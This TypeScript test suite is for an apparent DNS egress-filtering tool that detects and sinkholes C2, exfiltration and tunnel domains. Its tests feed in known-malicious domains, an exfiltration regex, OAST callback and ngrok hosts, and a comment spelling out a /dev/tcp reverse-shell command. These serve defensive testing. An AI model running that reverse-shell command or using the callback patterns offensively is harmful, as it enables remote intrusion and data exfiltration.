import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { calculateShannonEntropy } from '../src/engine/entropy.js';
import { CtiBlocklistManager, EGRESS_EXFIL_REGEX } from '../src/cti/blocklist.js';
import { parseDnsQueryPacket, buildDnsResponsePacket } from '../src/dns/packet.js';
import { SystemOneClient } from '../src/engine/system-one.js';
import { EgressEvaluator } from '../src/engine/evaluator.js';
import type { IEgressTelemetryReporter } from '../src/telemetry/reporter.js';

describe('Aegis Egress — Shannon Entropy Calculation', () => {
  it('should return low entropy for common legitimate domains', () => {
    const entropy = calculateShannonEntropy('google.com');
    assert.ok(entropy < 3.0, `Expected low entropy for google.com, got ${entropy}`);
  });

  it('should return high entropy (> 3.5) for random DGA domains', () => {
    const entropy = calculateShannonEntropy('x99b-c2-beacon.random-domain.top');
    assert.ok(entropy >= 3.5, `Expected high entropy for DGA domain, got ${entropy}`);
  });
});

describe('Aegis Egress — CTI Blocklist & Exfiltration Patterns', () => {
  it('should match known CTI malicious domains', () => {
    const cti = new CtiBlocklistManager();
    assert.strictEqual(cti.isBlocked('c2-beacon.random-domain.top'), true);
    assert.strictEqual(cti.isBlocked('google.com'), false);
  });

  it('should match exfiltration and reverse shell patterns', () => {
    assert.ok(EGRESS_EXFIL_REGEX.test('revshell-callback.darknet.top'));
    assert.ok(EGRESS_EXFIL_REGEX.test('cobaltstrike-beacon.evil.ru'));
    assert.strictEqual(EGRESS_EXFIL_REGEX.test('normal-api.corporate.com'), false);
  });

  it('should allow dynamic domain additions and removals', () => {
    const cti = new CtiBlocklistManager();
    cti.addDomain('new-malicious-domain.xyz');
    assert.strictEqual(cti.isBlocked('new-malicious-domain.xyz'), true);

    cti.removeDomain('new-malicious-domain.xyz');
    assert.strictEqual(cti.isBlocked('new-malicious-domain.xyz'), false);
  });
});

describe('Aegis Egress — DNS Packet Decoding & Response Crafting', () => {
  it('should parse RFC 1035 UDP DNS query packet', () => {
    // Standard query for "test.com"
    const header = Buffer.from([0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    const qname = Buffer.from([0x04, 0x74, 0x65, 0x73, 0x74, 0x03, 0x63, 0x6f, 0x6d, 0x00]);
    const qtypeClass = Buffer.from([0x00, 0x01, 0x00, 0x01]);
    const packet = Buffer.concat([header, qname, qtypeClass]);

    const parsed = parseDnsQueryPacket(packet);
    assert.ok(parsed !== null);
    assert.strictEqual(parsed?.fqdn, 'test.com');
  });

  it('should build Sinkhole 0.0.0.0 response when blocked', () => {
    const header = Buffer.from([0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    const qname = Buffer.from([0x04, 0x74, 0x65, 0x73, 0x74, 0x03, 0x63, 0x6f, 0x6d, 0x00]);
    const qtypeClass = Buffer.from([0x00, 0x01, 0x00, 0x01]);
    const packet = Buffer.concat([header, qname, qtypeClass]);

    const response = buildDnsResponsePacket(packet, packet.length, true);
    assert.ok(response.length > packet.length);
    // Sinkhole IP at the end is 0.0.0.0
    const ip = Array.from(response.subarray(response.length - 4)).join('.');
    assert.strictEqual(ip, '0.0.0.0');
  });

  it('should build resolved IP response when allowed', () => {
    const header = Buffer.from([0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    const qname = Buffer.from([0x04, 0x74, 0x65, 0x73, 0x74, 0x03, 0x63, 0x6f, 0x6d, 0x00]);
    const qtypeClass = Buffer.from([0x00, 0x01, 0x00, 0x01]);
    const packet = Buffer.concat([header, qname, qtypeClass]);

    const response = buildDnsResponsePacket(packet, packet.length, false);
    const ip = Array.from(response.subarray(response.length - 4)).join('.');
    assert.strictEqual(ip, '93.184.216.34');
  });
});

describe('Aegis Egress — Evaluator & Protection Modes', () => {
  const cti = new CtiBlocklistManager();
  const mockSystemOne = new SystemOneClient('http://localhost:9999/mock', 'nimble', '', cti);
  const mockTelemetry: IEgressTelemetryReporter = {
    async send() {
      return true;
    }
  };

  it('should block malicious C2 domain when protection is enabled', async () => {
    const evaluator = new EgressEvaluator(mockSystemOne, mockTelemetry, cti, 'tenant-1', true);
    const result = await evaluator.processQuery('c2-beacon.random-domain.top');
    assert.strictEqual(result.action, 'BLOCK');
    assert.strictEqual(result.threat_type, 'C2_KNOWN_THREAT_CTI');
  });

  it('should bypass and flag when protection is disabled', async () => {
    const evaluator = new EgressEvaluator(mockSystemOne, mockTelemetry, cti, 'tenant-1', false);
    const result = await evaluator.processQuery('c2-beacon.random-domain.top');
    assert.strictEqual(result.action, 'BYPASS');
    assert.ok(result.threat_type.includes('[EXFILTRÉ]'));
  });

  it('should allow legitimate domain and register its IP in DNS-to-IP allowlist', async () => {
    const evaluator = new EgressEvaluator(mockSystemOne, mockTelemetry, cti, 'tenant-1', true);
    const result = await evaluator.processQuery('google.com');
    assert.strictEqual(result.action, 'ALLOW');

    // Subsequent connection to resolved IP 93.184.216.34 should be allowed within TTL
    const ipCheck = await evaluator.verifyIpConnection('93.184.216.34', '127.0.0.1', 443);
    assert.strictEqual(ipCheck.action, 'ALLOW');
    assert.strictEqual(ipCheck.threat_type, 'CLEAN_EGRESS_DNS_VERIFIED');
  });

  it('should block direct literal IP outbound connections without prior DNS resolution (Verrou n°1 P0)', async () => {
    const evaluator = new EgressEvaluator(mockSystemOne, mockTelemetry, cti, 'tenant-1', true);
    // Simulate /bin/sh -i >& /dev/tcp/185.220.101.99/4444
    const result = await evaluator.processQuery('185.220.101.99:4444', '10.0.0.15', 'tcp_egress');
    assert.strictEqual(result.action, 'BLOCK');
    assert.strictEqual(result.threat_type, 'DIRECT_IP_REVERSE_SHELL_BLOCKED');

    // Internal RFC 1918 traffic should remain allowed
    const internalResult = await evaluator.verifyIpConnection('172.18.0.5', '172.18.0.2', 5432);
    assert.strictEqual(internalResult.action, 'ALLOW');
  });

  it('should sinkhole OAST blind exploit callback domains and LOTC exfiltration tunnels (Verrou n°5-Bis v1.3 Anti-Artex)', async () => {
    const evaluator = new EgressEvaluator(mockSystemOne, mockTelemetry, cti, 'tenant-1', true);

    const oastInteract = await evaluator.processQuery('c72k9a1v00001.interact.sh');
    assert.strictEqual(oastInteract.action, 'BLOCK');
    assert.strictEqual(oastInteract.threat_type, 'OAST_BLIND_EXPLOIT_CALLBACK_BLOCKED');

    const oastPro = await evaluator.processQuery('artex-ssrf-probe.oast.pro');
    assert.strictEqual(oastPro.action, 'BLOCK');
    assert.strictEqual(oastPro.threat_type, 'OAST_BLIND_EXPLOIT_CALLBACK_BLOCKED');

    const lotcNgrok = await evaluator.processQuery('a8f1-92-157.ngrok-free.app');
    assert.strictEqual(lotcNgrok.action, 'BLOCK');
    assert.strictEqual(lotcNgrok.threat_type, 'LOTC_TUNNEL_EXFILTRATION_BLOCKED');
  });
});

